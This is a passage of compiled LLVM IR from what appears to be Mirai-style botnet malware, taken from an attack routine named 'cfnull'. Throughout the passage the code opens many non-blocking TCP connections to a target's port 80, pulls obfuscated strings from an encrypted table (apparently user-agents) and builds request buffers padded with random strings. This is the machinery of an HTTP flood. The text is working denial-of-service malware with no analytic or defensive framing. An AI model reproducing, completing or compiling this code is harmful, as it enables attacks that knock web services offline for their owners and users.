  %136 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %133, i64 %135
  %137 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %136, i32 0, i32 4
  store i32 %132, i32* %137, align 4
  br label %138

138:                                              ; preds = %108, %64
  %139 = call i32 @rand_next()
  %140 = urem i32 %139, 15
  switch i32 %140, label %276 [
    i32 0, label %141
    i32 1, label %150
    i32 2, label %159
    i32 3, label %168
    i32 4, label %177
    i32 5, label %186
    i32 6, label %195
    i32 7, label %204
    i32 8, label %213
    i32 9, label %222
    i32 10, label %231
    i32 11, label %240
    i32 12, label %249
    i32 13, label %258
    i32 14, label %267
  ]

141:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 72)
  %142 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %143 = load i32, i32* %9, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %142, i64 %144
  %146 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %145, i32 0, i32 5
  %147 = getelementptr inbounds [512 x i8], [512 x i8]* %146, i64 0, i64 0
  %148 = call i8* @table_retrieve_val(i32 noundef 72, i32* noundef null)
  %149 = call i32 @util_strcpy(i8* noundef %147, i8* noundef %148)
  call void @table_lock_val(i8 noundef zeroext 72)
  br label %276

150:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 73)
  %151 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %152 = load i32, i32* %9, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %151, i64 %153
  %155 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %154, i32 0, i32 5
  %156 = getelementptr inbounds [512 x i8], [512 x i8]* %155, i64 0, i64 0
  %157 = call i8* @table_retrieve_val(i32 noundef 73, i32* noundef null)
  %158 = call i32 @util_strcpy(i8* noundef %156, i8* noundef %157)
  call void @table_lock_val(i8 noundef zeroext 73)
  br label %276

159:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 74)
  %160 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %160, i64 %162
  %164 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %163, i32 0, i32 5
  %165 = getelementptr inbounds [512 x i8], [512 x i8]* %164, i64 0, i64 0
  %166 = call i8* @table_retrieve_val(i32 noundef 74, i32* noundef null)
  %167 = call i32 @util_strcpy(i8* noundef %165, i8* noundef %166)
  call void @table_lock_val(i8 noundef zeroext 74)
  br label %276

168:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 75)
  %169 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %170 = load i32, i32* %9, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %172, i32 0, i32 5
  %174 = getelementptr inbounds [512 x i8], [512 x i8]* %173, i64 0, i64 0
  %175 = call i8* @table_retrieve_val(i32 noundef 75, i32* noundef null)
  %176 = call i32 @util_strcpy(i8* noundef %174, i8* noundef %175)
  call void @table_lock_val(i8 noundef zeroext 75)
  br label %276

177:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 76)
  %178 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %181, i32 0, i32 5
  %183 = getelementptr inbounds [512 x i8], [512 x i8]* %182, i64 0, i64 0
  %184 = call i8* @table_retrieve_val(i32 noundef 76, i32* noundef null)
  %185 = call i32 @util_strcpy(i8* noundef %183, i8* noundef %184)
  call void @table_lock_val(i8 noundef zeroext 76)
  br label %276

186:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 77)
  %187 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %188 = load i32, i32* %9, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %187, i64 %189
  %191 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %190, i32 0, i32 5
  %192 = getelementptr inbounds [512 x i8], [512 x i8]* %191, i64 0, i64 0
  %193 = call i8* @table_retrieve_val(i32 noundef 77, i32* noundef null)
  %194 = call i32 @util_strcpy(i8* noundef %192, i8* noundef %193)
  call void @table_lock_val(i8 noundef zeroext 77)
  br label %276

195:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 78)
  %196 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %199, i32 0, i32 5
  %201 = getelementptr inbounds [512 x i8], [512 x i8]* %200, i64 0, i64 0
  %202 = call i8* @table_retrieve_val(i32 noundef 78, i32* noundef null)
  %203 = call i32 @util_strcpy(i8* noundef %201, i8* noundef %202)
  call void @table_lock_val(i8 noundef zeroext 78)
  br label %276

204:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 79)
  %205 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %206 = load i32, i32* %9, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %208, i32 0, i32 5
  %210 = getelementptr inbounds [512 x i8], [512 x i8]* %209, i64 0, i64 0
  %211 = call i8* @table_retrieve_val(i32 noundef 79, i32* noundef null)
  %212 = call i32 @util_strcpy(i8* noundef %210, i8* noundef %211)
  call void @table_lock_val(i8 noundef zeroext 79)
  br label %276

213:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 80)
  %214 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %217, i32 0, i32 5
  %219 = getelementptr inbounds [512 x i8], [512 x i8]* %218, i64 0, i64 0
  %220 = call i8* @table_retrieve_val(i32 noundef 80, i32* noundef null)
  %221 = call i32 @util_strcpy(i8* noundef %219, i8* noundef %220)
  call void @table_lock_val(i8 noundef zeroext 80)
  br label %276

222:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 81)
  %223 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %224 = load i32, i32* %9, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %226, i32 0, i32 5
  %228 = getelementptr inbounds [512 x i8], [512 x i8]* %227, i64 0, i64 0
  %229 = call i8* @table_retrieve_val(i32 noundef 81, i32* noundef null)
  %230 = call i32 @util_strcpy(i8* noundef %228, i8* noundef %229)
  call void @table_lock_val(i8 noundef zeroext 81)
  br label %276

231:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 82)
  %232 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %233 = load i32, i32* %9, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %235, i32 0, i32 5
  %237 = getelementptr inbounds [512 x i8], [512 x i8]* %236, i64 0, i64 0
  %238 = call i8* @table_retrieve_val(i32 noundef 82, i32* noundef null)
  %239 = call i32 @util_strcpy(i8* noundef %237, i8* noundef %238)
  call void @table_lock_val(i8 noundef zeroext 82)
  br label %276

240:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 83)
  %241 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %242 = load i32, i32* %9, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %241, i64 %243
  %245 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %244, i32 0, i32 5
  %246 = getelementptr inbounds [512 x i8], [512 x i8]* %245, i64 0, i64 0
  %247 = call i8* @table_retrieve_val(i32 noundef 83, i32* noundef null)
  %248 = call i32 @util_strcpy(i8* noundef %246, i8* noundef %247)
  call void @table_lock_val(i8 noundef zeroext 83)
  br label %276

249:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 84)
  %250 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %251 = load i32, i32* %9, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %250, i64 %252
  %254 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %253, i32 0, i32 5
  %255 = getelementptr inbounds [512 x i8], [512 x i8]* %254, i64 0, i64 0
  %256 = call i8* @table_retrieve_val(i32 noundef 84, i32* noundef null)
  %257 = call i32 @util_strcpy(i8* noundef %255, i8* noundef %256)
  call void @table_lock_val(i8 noundef zeroext 84)
  br label %276

258:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 85)
  %259 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %262, i32 0, i32 5
  %264 = getelementptr inbounds [512 x i8], [512 x i8]* %263, i64 0, i64 0
  %265 = call i8* @table_retrieve_val(i32 noundef 85, i32* noundef null)
  %266 = call i32 @util_strcpy(i8* noundef %264, i8* noundef %265)
  call void @table_lock_val(i8 noundef zeroext 85)
  br label %276

267:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 86)
  %268 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %271, i32 0, i32 5
  %273 = getelementptr inbounds [512 x i8], [512 x i8]* %272, i64 0, i64 0
  %274 = call i8* @table_retrieve_val(i32 noundef 86, i32* noundef null)
  %275 = call i32 @util_strcpy(i8* noundef %273, i8* noundef %274)
  call void @table_lock_val(i8 noundef zeroext 86)
  br label %276

276:                                              ; preds = %267, %258, %249, %240, %231, %222, %213, %204, %195, %186, %177, %168, %159, %150, %141, %138
  br label %277

277:                                              ; preds = %276
  %278 = load i32, i32* %9, align 4
  %279 = add nsw i32 %278, 1
  store i32 %279, i32* %9, align 4
  br label %60, !llvm.loop !21

280:                                              ; preds = %60
  br label %281

281:                                              ; preds = %954, %856, %846, %280
  store i32 0, i32* %19, align 4
  %282 = call i64 @time(i64* noundef null) #6
  %283 = trunc i64 %282 to i32
  store i32 %283, i32* %23, align 4
  br label %284

284:                                              ; preds = %281
  store %struct.fd_set* %17, %struct.fd_set** %25, align 8
  store i32 0, i32* %24, align 4
  br label %285

285:                                              ; preds = %295, %284
  %286 = load i32, i32* %24, align 4
  %287 = zext i32 %286 to i64
  %288 = icmp ult i64 %287, 16
  br i1 %288, label %289, label %298

289:                                              ; preds = %285
  %290 = load %struct.fd_set*, %struct.fd_set** %25, align 8
  %291 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %290, i32 0, i32 0
  %292 = load i32, i32* %24, align 4
  %293 = zext i32 %292 to i64
  %294 = getelementptr inbounds [16 x i64], [16 x i64]* %291, i64 0, i64 %293
  store i64 0, i64* %294, align 8
  br label %295

295:                                              ; preds = %289
  %296 = load i32, i32* %24, align 4
  %297 = add i32 %296, 1
  store i32 %297, i32* %24, align 4
  br label %285, !llvm.loop !22

298:                                              ; preds = %285
  br label %299

299:                                              ; preds = %298
  br label %300

300:                                              ; preds = %299
  store %struct.fd_set* %18, %struct.fd_set** %27, align 8
  store i32 0, i32* %26, align 4
  br label %301

301:                                              ; preds = %311, %300
  %302 = load i32, i32* %26, align 4
  %303 = zext i32 %302 to i64
  %304 = icmp ult i64 %303, 16
  br i1 %304, label %305, label %314

305:                                              ; preds = %301
  %306 = load %struct.fd_set*, %struct.fd_set** %27, align 8
  %307 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %306, i32 0, i32 0
  %308 = load i32, i32* %26, align 4
  %309 = zext i32 %308 to i64
  %310 = getelementptr inbounds [16 x i64], [16 x i64]* %307, i64 0, i64 %309
  store i64 0, i64* %310, align 8
  br label %311

311:                                              ; preds = %305
  %312 = load i32, i32* %26, align 4
  %313 = add i32 %312, 1
  store i32 %313, i32* %26, align 4
  br label %301, !llvm.loop !23

314:                                              ; preds = %301
  br label %315

315:                                              ; preds = %314
  store i32 0, i32* %9, align 4
  br label %316

316:                                              ; preds = %840, %315
  %317 = load i32, i32* %9, align 4
  %318 = load i32, i32* %15, align 4
  %319 = icmp slt i32 %317, %318
  br i1 %319, label %320, label %843

320:                                              ; preds = %316
  %321 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %321, i64 %323
  store %struct.attack_cfnull_state* %324, %struct.attack_cfnull_state** %22, align 8
  %325 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %326 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %325, i32 0, i32 1
  %327 = load i8, i8* %326, align 4
  %328 = zext i8 %327 to i32
  %329 = icmp eq i32 %328, 1
  br i1 %329, label %330, label %333

330:                                              ; preds = %320
  %331 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %332 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %331, i32 0, i32 1
  store i8 0, i8* %332, align 4
  br label %333

333:                                              ; preds = %330, %320
  %334 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %335 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %334, i32 0, i32 1
  %336 = load i8, i8* %335, align 4
  %337 = zext i8 %336 to i32
  %338 = icmp eq i32 %337, 0
  br i1 %338, label %339, label %418

339:                                              ; preds = %333
  %340 = bitcast %struct.sockaddr_in* %28 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %340, i8 0, i64 16, i1 false)
  %341 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %342 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %341, i32 0, i32 0
  %343 = load i32, i32* %342, align 4
  %344 = icmp ne i32 %343, -1
  br i1 %344, label %345, label %350

345:                                              ; preds = %339
  %346 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %347 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %346, i32 0, i32 0
  %348 = load i32, i32* %347, align 4
  %349 = call i32 @close(i32 noundef %348)
  br label %350

350:                                              ; preds = %345, %339
  %351 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #6
  %352 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %353 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %352, i32 0, i32 0
  store i32 %351, i32* %353, align 4
  %354 = icmp eq i32 %351, -1
  br i1 %354, label %355, label %356

355:                                              ; preds = %350
  br label %840

356:                                              ; preds = %350
  %357 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %358 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %357, i32 0, i32 0
  %359 = load i32, i32* %358, align 4
  %360 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %361 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 4
  %363 = call i32 (i32, i32, ...) @fcntl(i32 noundef %362, i32 noundef 3, i32 noundef 0)
  %364 = or i32 2048, %363
  %365 = call i32 (i32, i32, ...) @fcntl(i32 noundef %359, i32 noundef 4, i32 noundef %364)
  store i32 65535, i32* %10, align 4
  %366 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %367 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %366, i32 0, i32 0
  %368 = load i32, i32* %367, align 4
  %369 = bitcast i32* %10 to i8*
  %370 = call i32 @setsockopt(i32 noundef %368, i32 noundef 0, i32 noundef 8, i8* noundef %369, i32 noundef 4) #6
  %371 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 0
  store i16 2, i16* %371, align 4
  %372 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %373 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %372, i32 0, i32 4
  %374 = load i32, i32* %373, align 4
  %375 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %376 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %375, i32 0, i32 0
  store i32 %374, i32* %376, align 4
  %377 = call zeroext i16 @htons(i16 noundef zeroext 80) #7
  %378 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 1
  store i16 %377, i16* %378, align 2
  %379 = load i32, i32* %23, align 4
  %380 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %381 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %380, i32 0, i32 2
  store i32 %379, i32* %381, align 4
  %382 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %383 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %382, i32 0, i32 1
  store i8 2, i8* %383, align 4
  %384 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %385 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 4
  %387 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %388 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %388, %struct.sockaddr** %387, align 8
  %389 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %390 = load %struct.sockaddr*, %struct.sockaddr** %389, align 8
  %391 = call i32 @connect(i32 noundef %386, %struct.sockaddr* %390, i32 noundef 16)
  %392 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %393 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %392, i32 0, i32 0
  %394 = load i32, i32* %393, align 4
  %395 = srem i32 %394, 64
  %396 = zext i32 %395 to i64
  %397 = shl i64 1, %396
  %398 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %399 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %400 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %399, i32 0, i32 0
  %401 = load i32, i32* %400, align 4
  %402 = sdiv i32 %401, 64
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds [16 x i64], [16 x i64]* %398, i64 0, i64 %403
  %405 = load i64, i64* %404, align 8
  %406 = or i64 %405, %397
  store i64 %406, i64* %404, align 8
  %407 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %408 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %407, i32 0, i32 0
  %409 = load i32, i32* %408, align 4
  %410 = load i32, i32* %19, align 4
  %411 = icmp sgt i32 %409, %410
  br i1 %411, label %412, label %417

412:                                              ; preds = %356
  %413 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %414 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %413, i32 0, i32 0
  %415 = load i32, i32* %414, align 4
  %416 = add nsw i32 %415, 1
  store i32 %416, i32* %19, align 4
  br label %417

417:                                              ; preds = %412, %356
  br label %839

418:                                              ; preds = %333
  %419 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %420 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %419, i32 0, i32 1
  %421 = load i8, i8* %420, align 4
  %422 = zext i8 %421 to i32
  %423 = icmp eq i32 %422, 2
  br i1 %423, label %424, label %467

424:                                              ; preds = %418
  %425 = load i32, i32* %23, align 4
  %426 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %427 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %426, i32 0, i32 2
  %428 = load i32, i32* %427, align 4
  %429 = sub i32 %425, %428
  %430 = icmp ugt i32 %429, 30
  br i1 %430, label %431, label %440

431:                                              ; preds = %424
  %432 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %433 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %432, i32 0, i32 1
  store i8 0, i8* %433, align 4
  %434 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %435 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %434, i32 0, i32 0
  %436 = load i32, i32* %435, align 4
  %437 = call i32 @close(i32 noundef %436)
  %438 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %439 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %438, i32 0, i32 0
  store i32 -1, i32* %439, align 4
  br label %840

440:                                              ; preds = %424
  %441 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %442 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %441, i32 0, i32 0
  %443 = load i32, i32* %442, align 4
  %444 = srem i32 %443, 64
  %445 = zext i32 %444 to i64
  %446 = shl i64 1, %445
  %447 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %448 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %449 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 4
  %451 = sdiv i32 %450, 64
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds [16 x i64], [16 x i64]* %447, i64 0, i64 %452
  %454 = load i64, i64* %453, align 8
  %455 = or i64 %454, %446
  store i64 %455, i64* %453, align 8
  %456 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %457 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %456, i32 0, i32 0
  %458 = load i32, i32* %457, align 4
  %459 = load i32, i32* %19, align 4
  %460 = icmp sgt i32 %458, %459
  br i1 %460, label %461, label %466

461:                                              ; preds = %440
  %462 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %463 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %462, i32 0, i32 0
  %464 = load i32, i32* %463, align 4
  %465 = add nsw i32 %464, 1
  store i32 %465, i32* %19, align 4
  br label %466

466:                                              ; preds = %461, %440
  br label %838

467:                                              ; preds = %418
  %468 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %469 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %468, i32 0, i32 1
  %470 = load i8, i8* %469, align 4
  %471 = zext i8 %470 to i32
  %472 = icmp eq i32 %471, 5
  br i1 %472, label %473, label %662

473:                                              ; preds = %467
  %474 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  call void @util_zero(i8* noundef %474, i32 noundef 10240)
  %475 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %476 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %477 = call i32 @util_strlen(i8* noundef %476)
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds i8, i8* %475, i64 %478
  %480 = call i32 @util_strcpy(i8* noundef %479, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0))
  %481 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %482 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %483 = call i32 @util_strlen(i8* noundef %482)
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds i8, i8* %481, i64 %484
  call void @rand_alphastr(i8* noundef %485, i32 noundef 16)
  %486 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %487 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %488 = call i32 @util_strlen(i8* noundef %487)
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds i8, i8* %486, i64 %489
  %491 = call i32 @util_strcpy(i8* noundef %490, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %492 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %493 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %494 = call i32 @util_strlen(i8* noundef %493)
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds i8, i8* %492, i64 %495
  %497 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %498 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %497, i32 0, i32 5
  %499 = getelementptr inbounds [512 x i8], [512 x i8]* %498, i64 0, i64 0
  %500 = call i32 @util_strcpy(i8* noundef %496, i8* noundef %499)
  %501 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %502 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %503 = call i32 @util_strlen(i8* noundef %502)
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds i8, i8* %501, i64 %504
  %506 = call i32 @util_strcpy(i8* noundef %505, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %507 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %508 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %509 = call i32 @util_strlen(i8* noundef %508)
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds i8, i8* %507, i64 %510
  %512 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %513 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %512, i32 0, i32 6
  %514 = getelementptr inbounds [129 x i8], [129 x i8]* %513, i64 0, i64 0
  %515 = call i32 @util_strcpy(i8* noundef %511, i8* noundef %514)
  %516 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %517 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %518 = call i32 @util_strlen(i8* noundef %517)
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds i8, i8* %516, i64 %519
  %521 = call i32 @util_strcpy(i8* noundef %520, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 57)
  %522 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %523 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %524 = call i32 @util_strlen(i8* noundef %523)
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds i8, i8* %522, i64 %525
  %527 = call i8* @table_retrieve_val(i32 noundef 57, i32* noundef null)
  %528 = call i32 @util_strcpy(i8* noundef %526, i8* noundef %527)
  call void @table_lock_val(i8 noundef zeroext 57)
  %529 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %530 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %531 = call i32 @util_strlen(i8* noundef %530)
  %532 = sext i32 %531 to i64
